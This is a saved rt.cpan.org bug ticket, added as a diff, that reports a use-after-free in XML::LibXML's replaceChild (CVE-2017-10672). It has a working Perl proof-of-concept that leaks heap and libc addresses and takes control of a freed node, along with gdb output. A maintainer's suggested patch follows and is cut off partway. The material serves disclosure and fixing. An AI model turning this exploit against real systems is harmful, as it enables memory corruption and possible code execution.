@@ -1,0 +1,1081 @@
+<!DOCTYPE html>
+
+<html lang="en">
+  <head>
+    <title>Bug #122246 for XML-LibXML: Use-after-free in XML::LibXML::Node::replaceChild</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <!-- The X-UA-Compatible <meta> tag above must be very early in <head> -->
+
+    <script>
+if (window.top !== window.self) {
+    document.write = "";
+
+    window.top.location = window.self.location;
+
+    setTimeout(function(){
+        document.body.innerHTML = "";
+    }, 1);
+
+    window.self.onload = function(){
+        document.body.innerHTML = "";
+    };
+}
+</script>
+
+
+
+<link rel="shortcut icon" href="/NoAuth/images/favicon.png" type="image/png" />
+<link rel="stylesheet" href="/NoAuth/css/aileron-squished-00f758259152f8b6670ee485f462e6b8.css" type="text/css" media="all" />
+<link rel="stylesheet" href="/NoAuth/css/print.css" type="text/css" media="print" />
+
+
+
+
+<script type="text/javascript" src="/NoAuth/js/squished-42167f2409ce368da2d31038e5cb2a57.js"></script>
+
+<script type="text/javascript"><!--
+	jQuery( loadTitleBoxStates );
+
+--></script>
+
+
+<!--[if lt IE 8]>
+<link rel="stylesheet" href="/NoAuth/css/aileron/msie.css" type="text/css" media="all" />
+<![endif]-->
+<!--[if lt IE 7]>
+<link rel="stylesheet" href="/NoAuth/css/aileron/msie6.css" type="text/css" media="all" />
+<![endif]-->
+<script type="text/javascript">
+jQuery(document).ready(function(){
+    jQuery.fn.supersubs.defaults = {
+        maxWidth: 30,
+        extraWidth: 2
+    };
+
+    jQuery("#app-nav.toplevel").addClass('sf-menu sf-js-enabled sf-shadow').supersubs().superfish({ speed: 'fast' });
+    jQuery("#page-menu.toplevel").addClass('sf-menu sf-js-enabled').supersubs().superfish({ dropShadows: false, speed: 'fast' }).supposition();
+});
+</script>
+
+
+<!-- Site CSS from theme editor -->
+<style type="text/css" media="all" id="sitecss">
+</style>
+
+<meta name="google-site-verification" content="kD3-uEJK1AkTqaC-rckcSt_HPkAj674DPPuEN6i-y0g" />
+
+</head>
+  <body class="aileron sidebyside" id="comp-Public-Bug-Display">
+
+<div id="logo">
+<a href="https://rt.cpan.org/"><img
+    src="/NoAuth/images/cpan.png"
+    alt="CPAN"
+    width="181"
+    height="38" /></a>
+    <span class="rtname">RT for rt.cpan.org</span>
+</div>
+
+
+<div id="quickbar">
+  <div id="quick-personal">
+    <span class="hide"><a href="#skipnav">Skip Menu</a> | </span>
+</div>
+
+</div>
+<div id="header"><h1>Bug #122246 for XML-LibXML: Use-after-free in XML::LibXML::Node::replaceChild</h1></div>
+
+
+<div id="main-navigation"><ul id="app-nav" class="toplevel">
+ <li id="li-search_dist"><a id="search_dist" class="menu-item " href="/Public/">Search Distributions</a></li>
+ <li id="li-browse_dist"><a id="browse_dist" class="menu-item " href="/Public/Dist/Browse.html">Browse Distributions</a></li>
+ <li id="li-about" class="has-children"><a id="about" class="menu-item " href="/NoAuth/RT/CPAN/About.html">About rt.cpan.org</a>
+ <ul>
+  <li id="li-about-usage"><a id="about-usage" class="menu-item " href="/NoAuth/RT/CPAN/Usage.html">How do I…?</a></li>
+  <li id="li-about-about"><a id="about-about" class="menu-item " href="/NoAuth/RT/CPAN/About.html">About</a></li>
+ </ul>
+ </li>
+ <li id="li-preferences"><a id="preferences" class="menu-item ">Welcome <span class="current-user">anonymous guest</span>.</a></li>
+ <li id="li-login"><a id="login" class="menu-item " href="/NoAuth/Logout.html">Login as another user</a></li>
+</ul></div>
+<div id="page-navigation"><ul id="page-menu" class="toplevel">
+ <li id="li-page-active_bugs"><a id="page-active_bugs" class="menu-item " href="/Public/Dist/Display.html?Status=Active;Name=XML-LibXML">Active bugs</a></li>
+ <li id="li-page-resolved_bugs"><a id="page-resolved_bugs" class="menu-item " href="/Public/Dist/Display.html?Status=Resolved;Name=XML-LibXML">Resolved bugs</a></li>
+ <li id="li-page-rejected_bugs"><a id="page-rejected_bugs" class="menu-item " href="/Public/Dist/Display.html?Status=Rejected;Name=XML-LibXML">Rejected bugs</a></li>
+ <li id="li-page-report"><a id="page-report" class="menu-item " href="/Public/Bug/Report.html?Queue=XML-LibXML">Report a new bug</a></li>
+</ul></div>
+<div id="topactions"><form action="/Public/Search/Simple.html" id="simple-search">
+  <input size="12" name="q" accesskey="0" class="field" value="" placeholder="Search..." />
+</form>
+
+<form action="/Public/Bug/Report.html" name="CreateTicketInQueue" id="CreateTicketInQueue" >
+<input type="submit" class="button" value="New ticket in" />&nbsp;<label accesskey="9">
+  <input name="Queue" size="25" placeholder="Module or distribution" value="" class="select-queue" data-autocomplete="Queues" data-autocomplete-autosubmit=1 data-autocomplete-params="right=CreateTicket" />
+
+</label>
+
+</form>
+
+</div>
+<div id="body">
+<div id="announcement" style="padding: 1em; margin: 1em; border: solid black 1px; background: #eee">
+<a href="https://log.perl.org/2020/12/rtcpanorg-sunset.html">rt.cpan.org will be shut down on March 1st, 2021.</a>
+</div>
+
+<a name="skipnav" id="skipnav" accesskey="8"></a>
+
+
+
+
+
+<p>This queue is for tickets about the <a href="https://metacpan.org/release/XML-LibXML">XML-LibXML CPAN distribution</a>.</p>
+
+
+
+
+
+<div class="">
+  <div class="titlebox" id="">
+  <div class="titlebox-title">
+    <span class="widget"><a href="#" onclick="return rollup('TitleBox\x2D\x2D\x5FPublic\x5FBug\x5FDisplay\x5Fhtml\x2D\x2D\x2D\x2D\x2D\x2DUmVwb3J0IGluZm9ybWF0aW9u\x2D\x2D\x2D0');" title="Toggle visibility"></a></span>
+    <span class="left">Report information</span>
+    <span class="right-empty">		    </span>
+  </div>
+  <div class="titlebox-content " id="TitleBox--_Public_Bug_Display_html------UmVwb3J0IGluZm9ybWF0aW9u---0">
+
+
+<table width="100%" class="ticket-summary">
+<tr>
+  <td valign="top" class="boxcontainer">
+    <div class="ticket-info-basics">
+  <div class="titlebox ticket-info-basics " id="">
+  <div class="titlebox-title">
+    <span class="widget"><a href="#" onclick="return rollup('TitleBox\x2D\x2D\x5FPublic\x5FBug\x5FDisplay\x5Fhtml\x2D\x2Dticket\x2Dinfo\x2Dbasics\x2D\x2D\x2D\x2DVGhlIEJhc2ljcw\x5F\x5F\x2D\x2D\x2D0');" title="Toggle visibility"></a></span>
+    <span class="left">The Basics</span>
+    <span class="right-empty">		    </span>
+  </div>
+  <div class="titlebox-content " id="TitleBox--_Public_Bug_Display_html--ticket-info-basics----VGhlIEJhc2ljcw__---0">
+
+
+        <table>
+  <tr class="id">
+    <td class="label">Id:</td>
+    <td class="value">122246</td>
+  </tr>
+  <tr class="status">
+    <td class="label">Status:</td>
+    <td class="value">open</td>
+  </tr>
+  <tr class="priority">
+    <td class="label">Priority:</td>
+    <td class="value">0/
+</td>
+  </tr>
+  <tr class="queue">
+    <td class="label">Queue:</td>
+    <td class="value"><a href="/Dist/Display.html?Queue=XML-LibXML">XML-LibXML</a>
+</td>
+  </tr>
+</table>
+
+        <hr class="clear" />
+  </div>
+</div>
+
+
+
+
+</div>
+
+
+    <div class="ticket-info-people">
+  <div class="titlebox ticket-info-people " id="">
+  <div class="titlebox-title">
+    <span class="widget"><a href="#" onclick="return rollup('TitleBox\x2D\x2D\x5FPublic\x5FBug\x5FDisplay\x5Fhtml\x2D\x2Dticket\x2Dinfo\x2Dpeople\x2D\x2D\x2D\x2DUGVvcGxl\x2D\x2D\x2D0');" title="Toggle visibility"></a></span>
+    <span class="left">People</span>
+    <span class="right-empty">		    </span>
+  </div>
+  <div class="titlebox-content " id="TitleBox--_Public_Bug_Display_html--ticket-info-people----UGVvcGxl---0">
+
+
+        <table>
+  <tr>
+    <td class="label">Owner:</td>
+    <td class="value">Nobody in particular
+    
+    </td>
+  </tr>
+  <tr>
+    <td class="labeltop">Requestors:</td>
+    <td class="value">
+tadinhsung [...] gmail.com
+
+<br />
+
+</td>
+  </tr>
+  <tr>
+    <td class="labeltop">Cc:</td>
+    <td class="value">
+CARNIL [...] cpan.org
+
+<br />
+
+</td>
+  </tr>
+  <tr>
+    <td class="labeltop">AdminCc:</td>
+    <td class="value">
+
+</td>
+  </tr>
+</table>
+
+        <hr class="clear" />
+  </div>
+</div>
+
+
+
+
+</div>
+
+
+
+  </td>
+  <td valign="top" class="boxcontainer">
+    
+    <div class="ticket-info-cfs">
+  <div class="titlebox ticket-info-cfs " id="">
+  <div class="titlebox-title">
+    <span class="widget"><a href="#" onclick="return rollup('TitleBox\x2D\x2D\x5FPublic\x5FBug\x5FDisplay\x5Fhtml\x2D\x2Dticket\x2Dinfo\x2Dcfs\x2D\x2D\x2D\x2DQnVnIEluZm9ybWF0aW9u\x2D\x2D\x2D0');" title="Toggle visibility"></a></span>
+    <span class="left">Bug Information</span>
+    <span class="right-empty">		    </span>
+  </div>
+  <div class="titlebox-content " id="TitleBox--_Public_Bug_Display_html--ticket-info-cfs----QnVnIEluZm9ybWF0aW9u---0">
+
+ 
+        <table>
+  <tr id="CF-1-ShowRow">
+    <td class="label">Severity:</td>
+    <td class="value">
+Critical    </td>
+  </tr>
+  <tr id="CF-37350-ShowRow">
+    <td class="label">Broken in:</td>
+    <td class="value">
+2.0129    </td>
+  </tr>
+  <tr id="CF-37351-ShowRow">
+    <td class="label">Fixed in:</td>
+    <td class="value">
+<i>(no value)</i>
+    </td>
+  </tr>
+</table>
+
+
+        <hr class="clear" />
+  </div>
+</div>
+
+
+
+
+</div>
+
+
+    <div class="ticket-info-attachments">
+  <div class="titlebox ticket-info-attachments " id="">
+  <div class="titlebox-title inverse">
+    <span class="widget"><a href="#" onclick="return rollup('TitleBox\x2D\x2D\x5FPublic\x5FBug\x5FDisplay\x5Fhtml\x2D\x2Dticket\x2Dinfo\x2Dattachments\x2D\x2D\x2D\x2DQXR0YWNobWVudHM\x5F\x2D\x2D\x2D0');" title="Toggle visibility"></a></span>
+    <span class="left">Attachments</span>
+    <span class="right-empty">		    </span>
+  </div>
+  <div class="titlebox-content " id="TitleBox--_Public_Bug_Display_html--ticket-info-attachments----QXR0YWNobWVudHM_---0">
+
+
+
+
+poc.pl<br />
+<ul>
+
+
+<li><font size="-2">
+<a href="/Ticket/Attachment/1735433/933196/poc.pl">
+Tue Jun 27 04:46:48 2017 (1.2k) by tadinhsung [...] gmail.com
+</a>
+</font></li>
+</ul>
+
+
+XML-LibXML-2.0129.patch<br />
+<ul>
+
+
+<li><font size="-2">
+<a href="/Ticket/Attachment/1741171/936535/XML-LibXML-2.0129.patch">
+Wed Jul 26 09:20:16 2017 (5k) by TLU [...] cpan.org
+</a>
+</font></li>
+
+
+<li><font size="-2">
+<a href="/Ticket/Attachment/1738803/935118/XML-LibXML-2.0129.patch">
+Thu Jul 13 08:09:09 2017 (3.2k) by TLU [...] cpan.org
+</a>
+</font></li>
+</ul>
+
+    <hr class="clear" />
+  </div>
+</div>
+
+
+
+
+</div>
+
+
+
+
+
+
+
+  </td>
+</tr>
+</table>
+
+    <hr class="clear" />
+  </div>
+</div>
+
+
+
+
+</div>
+
+
+<br />
+
+
+<div class="history">
+<div class="titlebox" id="">
+  <div class="titlebox-title">
+    <span class="widget"><a href="#" onclick="return rollup('TitleBox\x2D\x2D\x5FPublic\x5FBug\x5FDisplay\x5Fhtml\x2D\x2D\x2D\x2D\x2D\x2DSGlzdG9yeQ\x5F\x5F\x2D\x2D\x2D0');" title="Toggle visibility"></a></span>
+    <span class="left">History</span>
+    <span class="right">		<a href="#" data-direction="open" onclick="return toggle_all_folds(this, 'Show\x20all\x20quoted\x20text', 'Hide\x20all\x20quoted\x20text');">Show all quoted text</a> &mdash; <a href="/Public/Bug/Display.html?ShowHeaders=1;id=122246">Show full headers</a>    </span>
+  </div>
+  <div class="titlebox-content " id="TitleBox--_Public_Bug_Display_html------SGlzdG9yeQ__---0">
+
+
+<div id="ticket-history">
+<div class="ticket-transaction message Create odd">
+<div class="ticket-transaction">
+  <div class="metadata">
+    <span class="type">
+      <a name="txn-1735433" href="/Public/Bug/Display.html?id=122246#txn-1735433">#</a>      
+    </span>
+    <span class="date">Tue&nbsp;Jun&nbsp;27&nbsp;04:46:48&nbsp;2017</span>
+    <span class="description">tadinhsung [...] gmail.com -  Ticket created</span>
+    <span class="time-taken"></span>    <span class="actions hidden"></span>
+  </div>
+    <div class="content">
+      
+<table>
+  <tr>
+    <td align="right" class="message-header-key">Subject:</td>
+    <td class="message-header-value"> Use-after-free in XML::LibXML::Node::replaceChild</td>
+  </tr>
+</table>
+<div class="messageattachments">
+<div class="downloadattachment">
+<a href="/Ticket/Attachment/1735433/933195/">Download &#40;untitled&#41;</a> / <a href="/Ticket/Attachment/WithHeaders/933195">with headers</a>
+<br />
+<span class="downloadcontenttype">text/plain 6.3k</span>
+</div>
+<div class="messagebody">
+<div class="message-stanza plain-text-white-space">Hi there,
+I’ve just found out one issue.
+
+==================================================
+affected on version 2.0129 and before
+Use-after-free in XML::LibXML::Node::replaceChild
+
+0x1:
+If we use same node to replace like: $root-&gt;replaceChild&#40;$ufanode,$ufanode&#41;; 
+and call function domReplaceChild&#40;..&#41; &#40;<span class="clickylink"><a target="new" rel="nofollow" href="https://github.com/shlomif/perl-XML-LibXML/blob/master/LibXML.xs#L4851">https://github.com/shlomif/perl-XML-LibXML/blob/master/LibXML.xs#L4851</a></span> &#41;
+but at <span class="clickylink"><a target="new" rel="nofollow" href="https://github.com">https://github.com</a></span> /shlomif/perl-XML-LibXML/blob/master/dom.c#L800 
+ if &#40; new == old &#41;
+        return new;
+it&#39;s just return pointer new without check HIERARCHY, then it&#39;ll call PmmFixOwner&#40;..&#41;-&gt;PmmREFCNT_dec&#40;..&#41; <span class="clickylink"><a target="new" rel="nofollow" href="https://github.com/shlomif/perl-XML-LibXML/blob/master/perl-libxml-mm.c#L748">https://github.com/shlomif/perl-XML-LibXML/blob/master/perl-libxml-mm.c#L748</a></span>
+at this time ref_count of oldParent=1,the proxy counter&#39;ll decrease to 0 and freemeanwhile the oldparent pointer is not unlink on root yet, so we can abuse this $ufanode pointer.
+We can malloc some new text node with same size&#40;0x80&#41; and overwrite this $ufanode memory in order to create new fakenode.
+
+
+0x2:
+
+This is PoC can leak memory and control all data of $ufanode, leads to code execution bug.
+Each time when perl inits and parses, heap mem status chunks is always changing, that make it’s hard to debug and you may have to run this PoC several times.. 
+
+
+[Code]
+use utf8;
+use XML::LibXML;
+binmode STDOUT, &#34;:utf8&#34;;
+use open &#39;:encoding&#40;utf8&#41;&#39;;
+BEGIN { $| = 1 }
+my $data=&#39;&lt;mipu94&gt;ufanode&gt;-------------------------------------------------------tadinhsung-at-gmail-dot-com---------------------------------- -------------------&lt;/ufanode&gt;
+
+my $parser = XML::LibXML-&gt;new&#40;&#41;;
+my $info = $parser-&gt;load_xml&#40;string=&gt;$data&#41; or die;
+my $root = $info-&gt;findnodes&#40;&#34;mipu94&#34;&#41;-&gt;[0];
+my $ufanode = $root-&gt;findnodes&#40;&#34;pwn4fun/ufanode&#34;&#41;-&gt;[0];
+$root-&gt;replaceChild&#40;$ufanode,$ufanode&#41;; # triggle free ufanode
+my $k =$root-&gt;toString;
+
+Encode::_utf8_off&#40;$k&#41;; # need off utf8 to get wide characters
+$x=index&#40;$k,&#34;\xff\x7f&#34;&#41;;
+my $heapoff=substr&#40;$k,18,3&#41;.&#34;\x00&#34;;
+my $libcoff=substr&#40;$k,$x-4,6&#41;.&#34;\x00\x00&#34;;
+
+my $heap = unpack&#40;&#34;I&#34;,$heapoff&#41;;
+my $libc = unpack&#40;&#34;Q&#34;,$libcoff&#41;;
+my $tmp = 0xfffffffff000;
+$libc = $libc &#38; $tmp;
+
+print sprintf&#40;&#34;heap: 0x%x\n&#34;,$heap&#41;;
+print sprintf&#40;&#34;libc: 0x%x\n&#34;,$libc&#41;;
+my $payload=pack&#40;&#34;Q&#34;, 0x0&#41;. 
+pack&#40;&#34;Q&#34;,0x4141414142424242&#41;x11;
+#try malloc again and  refill to create fake ufanode 
+my $fill0=&#34;$payload&#34;;
+my $fill1=&#34;$payload&#34;;
+my $fill2=&#34;$payload&#34;;
+my $fill3=&#34;$payload&#34;;
+my $fill4=&#34;$payload&#34;;
+&lt; div style=&#34;font-size:12.8px&#34;&gt;my $fill5=&#34;$payload&#34;;
+
+my $fakenode=$root-&gt;lastChild-&gt;lastChild;
+print &#34;\i&#39;m still ok and go more far!\n&#34;;
+
+
+[Code]
+
+0x3:
+i tested this poc on perl 5, version 27, subversion 1 &#40;v5.27.1-37-g4c95ee9&#41; and Ubuntu 16.04 LTS 
+
+Some info debug on gdb-peda&#40;heap&#41;:
+
+gdb-peda$ r poc
+....
+heap: 0x66346e
+libc: 0x7ffff746f000
+
+[----------------------------------registers-----------------------------------]
+RAX: 0x7f0c80 --&gt; 0xbb9b30 &#40;0x00000000007f0c80&#41;
+RBX: 0x1 
+RCX: 0x646f4e3a3a4c4d58 &#40;&#39;XML::Nod&#39;&#41;
+RDX: 0xbb99a0 --&gt; 0x9350d0 &#40;0x0000000000bb99a0&#41;
+RSI: 0x9350d0 --&gt; 0xbb99a0 &#40;0x00000000009350d0&#41;
+RDI: 0xbb9ac0 --&gt; 0x0 
+RBP: 0x7d7f48 --&gt; 0x7ddb50 --&gt; 0x7d14a0 --&gt; 0x0 
+RSP: 0x7fffffffe270 --&gt; 0x0 
+RIP: 0x7ffff615a77f &#40;&lt;XS_XML__LibXML__Node_lastChild+159&gt;:      call   0x7ffff6150160 &lt;PmmNodeToSv@plt&gt;&#41;
+R8 : 0x0 
+R9 : 0x8 
+R10 : 0x20 &#40;&#39; &#39;&#41;
+R11: 0x7ffff723ff50 --&gt; 0xfffda370fffda09f 
+R12: 0x7d1458 --&gt; 0x7ddb58 --&gt; 0x7f69b0 --&gt; 0x7f69a0 --&gt; 0x20c0000c00000001 
+R13: 0x8 
+R14: 0xb8efa8 --&gt; 0xb93750 --&gt; 0x0 
+R15: 0x0
+EFLAGS: 0x10206 &#40;carry PARITY adjust zero sign trap INTERRUPT direction overflow&#41;
+[-------------------------------------code-------------------------------------]
+   0x7ffff615a776 &lt;XS_XML__LibXML__Node_lastChild+150&gt;: je     0x7ffff615a77b &lt;XS_XML__LibXML__Node_lastChild+155&gt;
+   0x7ffff615a778 &lt;XS_XML__LibXML__Node_lastChild+152&gt;: mov    rsi,QWORD PTR [rdx]
+   0x7ffff615a77b &#38; lt;XS_XML__LibXML__Node_lastChild+155&gt;: mov    rdi,QWORD PTR [rax+0x20]
+=&gt; 0x7ffff615a77f &lt;XS_XML__LibXML__Node_lastChild+159&gt;: call   0x7ffff6150160 &lt;PmmNodeToSv@plt&gt;
+   0x7ffff615a784 &lt;XS_XML__LibXML__Node_lastChild+164&gt;: mov    rdi,rax
+   0x7ffff615a787 &lt;XS_XML__LibXML__Node_lastChild+167&gt;: call   0x7ffff6151100 &lt;Perl_sv_2mortal@plt&gt;
+   0x7ffff615a78c &lt;XS_XML__LibXML__Node_lastChild+172&gt;: mov    rdx,QWORD PTR [rbp+0x0]
+   0x7ffff615a790 &lt;XS_XML__LibXML__Node_lastChild+176&gt;: mov    QWORD PTR [rdx+rbx*8],rax
+Guessed arguments:
+arg[0]: 0xbb9ac0 --&gt; 0x0 
+arg[1]: 0x9350d0 --&gt; 0xbb99a0 &#40;0x00000000009350d0&#41;
+arg[2]: 0xbb99a0 --&gt; 0x9350d0 &#40;0x0000000000bb99a0&#41;
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffe270 --&gt; 0x0 
+0008| 0x7fffffffe278 --&gt; 0x1 
+0016| 0x7fffffffe280 --&gt; 0x0 
+0024| 0x7fffffffe288 --&gt; 0x7ddb50 --&gt; 0x7d14a0 --&gt; 0x0 
+0032| 0x7fffffffe290 --&gt; 0x1 
+0040| 0x7fffffffe298 --&gt; 0x4bb1b8 &#40;&lt;Perl_pp_entersub+1144&gt;:     test   bl,bl&#41;
+0048| 0x7fffffffe2a0 --&gt; 0xb8e738 --&gt; 0x928540 --&gt; 0x0 
+0056| 0x7fffffffe2a8 --&gt; 0x4bd716 &#40;&lt;Perl_pp_method_named+454&gt;:  test   rax,rax&#41;
+[-------------------- ----------------------------------------------------------] blue
+Legend: code, data, rodata, value
+
+Breakpoint 5, 0x00007ffff615a77f in XS_XML__LibXML__Node_lastChild &#40;&#41; from /usr/local/lib/perl5/site_perl/5.27.1/x86_64-linux/auto/XML/LibXML/LibXML.so
+gdb-peda$ xstruct node $rdi
+struct node = 0xbb9ac0 imported from peda-structs :
+
+private         [0] 0xbb9ac0[heap]--&gt; 0x0
+type            [0] 0xbb9ac8[heap]&#40;&#34;BBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAA&#34;&#41;
+*name           [0] 0xbb9ad0[heap]&#40;&#34;BBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBB AAAABBBBAAAA&#34;&#41;
+children        [0] 0xbb9ad8[heap]&#40;&#34;BBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAA&#34;&#41;
+last            [0] 0xbb9ae0[heap]&#40;&#34;BBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAA&#34;&#41;
+parent          [0] 0xbb9ae8[heap]&#40;&#34;BBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAA&#34;&#41;
+next            [0] 0xbb9af0[heap]&#40;&#34;BBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAA&#34;&#41;
+prev            [0] 0xbb9af8[heap]&#40;&#34;BBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAA&#34;&#41;
+doc             [0] 0xbb9b00[heap]&#40;&#34;BBBBAAAABBBBAAAABBBBAAAABBBBAAAA&#34;&#41;
+name_space      [0] 0xbb9b08[heap]&#40;&#34;BBBBAAAABBBBAAAABBBBAAAA&#34;&#41;
+content         [0] 0xbb9b10[heap]&#40;&#34;BBBBAAAABBBBAAAA&#34;&#41;
+properties      [0] 0xbb9b18[heap]&#40;&#34;BBBBAAAA&#34;&#41;
+nsDef           [0] 0xbb9b20[heap]--&gt; 0x100
+psvi            [0] 0xbb9b28[heap]--&gt; 0x21&#40;&#39;!&#39;&#41;
+line            0x0c80
+extra           0x007f
+
+$rdi now is $ufanode and we all control this node. And can go more far like get shell :&#41;
+</div></div>
+<table>
+  <tr>
+    <td align="right" class="message-header-key">Subject:</td>
+    <td class="message-header-value"> poc.pl</td>
+  </tr>
+</table>
+<div class="downloadattachment">
+<a href="/Ticket/Attachment/1735433/933196/poc.pl">Download poc.pl</a><br />
+<span class="downloadcontenttype">text/x-perl 1.2k</span>
+</div>
+<div class="messagebody">
+<div class="message-stanza plain-text-white-space">use utf8;
+use XML::LibXML;
+binmode STDOUT, &#34;:utf8&#34;;
+use open &#39;:encoding&#40;utf8&#41;&#39;;
+BEGIN { $| = 1 }
+my $data=&#39;&lt;mipu94&gt;&lt;pwn4fun&gt;&lt;ufanode&gt;-------------------------------------------------------tadinhsung-at-gmail-dot-com-----------------------------------------------------&lt;/ufanode&gt;&lt;/pwn4fun&gt;&lt;/mipu94&gt;&#39;;
+
+my $parser = XML::LibXML-&gt;new&#40;&#41;;
+my $info = $parser-&gt;load_xml&#40;string=&gt;$data&#41; or die;
+my $root = $info-&gt;findnodes&#40;&#34;mipu94&#34;&#41;-&gt;[0];
+my $ufanode = $root-&gt;findnodes&#40;&#34;pwn4fun/ufanode&#34;&#41;-&gt;[0];
+$root-&gt;replaceChild&#40;$ufanode,$ufanode&#41;; # triggle free ufanode
+my $k =$root-&gt;toString;
+print $k;
+Encode::_utf8_off&#40;$k&#41;; # need off utf8 to get wide characters
+$x=index&#40;$k,&#34;\xff\x7f&#34;&#41;;
+my $heapoff=substr&#40;$k,18,3&#41;.&#34;\x00&#34;;
+my $libcoff=substr&#40;$k,$x-4,6&#41;.&#34;\x00\x00&#34;;
+
+my $heap = unpack&#40;&#34;I&#34;,$heapoff&#41;;
+my $libc = unpack&#40;&#34;Q&#34;,$libcoff&#41;;
+my $tmp = 0xfffffffff000;
+$libc = $libc &#38; $tmp;
+
+print sprintf&#40;&#34;heap: 0x%x\n&#34;,$heap&#41;;
+print sprintf&#40;&#34;libc: 0x%x\n&#34;,$libc&#41;;
+my $payload=pack&#40;&#34;Q&#34;, 0x0&#41;. 
+pack&#40;&#34;Q&#34;,0x4141414142424242&#41;x11;
+#try malloc again and refill to create fake ufanode 
+my $fill=&#34;$payload&#34;;
+my $fill1=&#34;$payload&#34;;
+my $fill2=&#34;$payload&#34;;
+my $fill3=&#34;$payload&#34;;
+my $fill4=&#34;$payload&#34;;
+my $fill5=&#34;$payload&#34;;
+
+my $fakenode=$root-&gt;lastChild-&gt;lastChild;
+print &#34;\i&#39;m still ok and go more far!\n&#34;;</div></div>
+</div>
+    </div>
+</div>
+</div>
+<div class="ticket-transaction message Correspond even">
+<div class="ticket-transaction">
+  <div class="metadata">
+    <span class="type">
+      <a name="txn-1735970" href="/Public/Bug/Display.html?id=122246#txn-1735970">#</a>      
+    </span>
+    <span class="date">Thu&nbsp;Jun&nbsp;29&nbsp;07:33:25&nbsp;2017</span>
+    <span class="description">CARNIL [...] cpan.org -  Correspondence added</span>
+    <span class="time-taken"></span>    <span class="actions hidden"></span>
+  </div>
+    <div class="content">
+      
+<div class="downloadattachment">
+<a href="/Ticket/Attachment/1735970/933583/">Download &#40;untitled&#41;</a> / <a href="/Ticket/Attachment/WithHeaders/933583">with headers</a>
+<br />
+<span class="downloadcontenttype">text/plain 90b</span>
+</div>
+<div class="messagebody">
+<div class="message-stanza plain-text-white-space">This issue has been assigned <span class="clickylink"><a target="new" rel="nofollow" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-10672">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-10672</a></span>
+</div></div>
+    </div>
+</div>
+</div>
+<div class="ticket-transaction basics Status odd">
+<div class="ticket-transaction">
+  <div class="metadata">
+    <span class="type">
+      <a name="txn-1735971" href="/Public/Bug/Display.html?id=122246#txn-1735971">#</a>      
+    </span>
+    <span class="date">Thu&nbsp;Jun&nbsp;29&nbsp;07:33:26&nbsp;2017</span>
+    <span class="description">The RT System itself -  Status changed from &#39;new&#39; to &#39;open&#39;</span>
+    <span class="time-taken"></span>    <span class="actions hidden"></span>
+  </div>
+    <div class="content">
+    </div>
+</div>
+</div>
+<div class="ticket-transaction people AddWatcher even">
+<div class="ticket-transaction">
+  <div class="metadata">
+    <span class="type">
+      <a name="txn-1735980" href="/Public/Bug/Display.html?id=122246#txn-1735980">#</a>      
+    </span>
+    <span class="date">Thu&nbsp;Jun&nbsp;29&nbsp;07:34:07&nbsp;2017</span>
+    <span class="description">CARNIL [...] cpan.org -  Cc CARNIL added</span>
+    <span class="time-taken"></span>    <span class="actions hidden"></span>
+  </div>
+    <div class="content">
+    </div>
+</div>
+</div>
+<div class="ticket-transaction message Correspond odd">
+<div class="ticket-transaction">
+  <div class="metadata">
+    <span class="type">
+      <a name="txn-1738803" href="/Public/Bug/Display.html?id=122246#txn-1738803">#</a>      
+    </span>
+    <span class="date">Thu&nbsp;Jul&nbsp;13&nbsp;08:09:08&nbsp;2017</span>
+    <span class="description">TLU [...] cpan.org -  Correspondence added</span>
+    <span class="time-taken"></span>    <span class="actions hidden"></span>
+  </div>
+    <div class="content">
+      
+<table>
+  <tr>
+    <td align="right" class="message-header-key">Subject:</td>
+    <td class="message-header-value"> Suggestion for a fix &#40;maybe naive&#41;</td>
+  </tr>
+</table>
+<div class="messageattachments">
+<div class="downloadattachment">
+<a href="/Ticket/Attachment/1738803/935117/">Download &#40;untitled&#41;</a> / <a href="/Ticket/Attachment/WithHeaders/935117">with headers</a>
+<br />
+<span class="downloadcontenttype">text/plain 425b</span>
+</div>
+<div class="messagebody">
+<div class="message-stanza plain-text-white-space">On Tue Jun 27 04:46:48 2017, tadinhsung@gmail.com wrote:
+<span
+    class="message-stanza-folder closed"
+    onclick="fold_message_stanza(this, 'Show\x20quoted\x20text', 'Hide\x20quoted\x20text');">Show quoted text</span><br /><div class="message-stanza closed">&gt; I’ve just found out one issue.
+</div>[...]
+
+Hi,
+
+since the problem only occurs when a node is replaced with itself, pulling the old == new check from domReplaceChild up into replaceChild should solve the problem, right?
+
+I made a little patch which keeps the PoC from crashing and which I&#39;ll attach here. Feel free to tell me what I didn&#39;t think of :-&#41;
+
+Regards,
+Torsten
+</div></div>
+<table>
+  <tr>
+    <td align="right" class="message-header-key">Subject:</td>
+    <td class="message-header-value"> XML-LibXML-2.0129.patch</td>
+  </tr>
+</table>
+<div class="downloadattachment">
+<a href="/Ticket/Attachment/1738803/935118/XML-LibXML-2.0129.patch">Download XML-LibXML-2.0129.patch</a><br />
+<span class="downloadcontenttype">text/x-diff 3.2k</span>
+</div>
+<div class="messagebody">
+<div class="message-stanza plain-text-white-space">diff -urN XML-LibXML-2.0129.orig/LibXML.xs XML-LibXML-2.0129/LibXML.xs
+--- XML-LibXML-2.0129.orig/LibXML.xs	2016-06-24 18:01:53.000000000 +0200
++++ XML-LibXML-2.0129/LibXML.xs	2017-07-13 12:41:48.000000000 +0200
+@@ -4829,38 +4829,42 @@
+     PREINIT:
+         xmlNodePtr ret = NULL;
+     CODE:
+-       if &#40; self-&gt;type == XML_DOCUMENT_NODE &#41; {
+-                switch &#40; nNode-&gt;type &#41; {
+-                case XML_ELEMENT_NODE:
+-                    warn&#40;&#34;replaceChild with an element on a document node not supported yet!&#34;&#41;;
+-                    XSRETURN_UNDEF;
+-                    break;
+-                case XML_DOCUMENT_FRAG_NODE:
